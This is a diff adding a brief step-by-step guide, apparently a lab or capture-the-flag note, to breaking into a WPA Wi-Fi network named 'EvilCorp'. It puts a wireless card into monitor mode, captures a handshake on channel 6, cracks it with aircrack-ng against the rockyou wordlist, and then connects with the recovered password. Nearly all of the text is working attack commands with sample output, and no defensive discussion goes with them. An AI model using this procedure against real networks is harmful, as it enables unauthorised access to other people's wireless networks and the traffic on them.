@@ -1,0 +1,25 @@
+
+Step1. Enable 'monitor mode':
+# airmon-ng start wlan0
+
+
+Step2. Start listening for handshakes on channel 6:
+# airodump-ng wlan0mon -c 6 -w dump
+
+
+Once it says 'WPA handshake: ...' then you have the captured the handshake. Press ctrl-c
+First line should look like this:
+CH  6 ][ Elapsed: 6 s ][ 2018-06-26 07:55 ][ WPA handshake: 00:18:F8:F1:A9:57  
+
+
+Step3. Crack the WPA Handshake using aircrack-ng:
+# gunzip /usr/share/wordlists/rockyou.txt.gz
+# aircrack-ng dump-01.cap -w /usr/share/wordlists/rockyou.txt 
+
+
+
+Step4. Dont forget to disable 'monitor mode'
+# airmon-ng stop wlan0mon
+
+
+Step5. Connect to the EvilCorp wifi using the password!
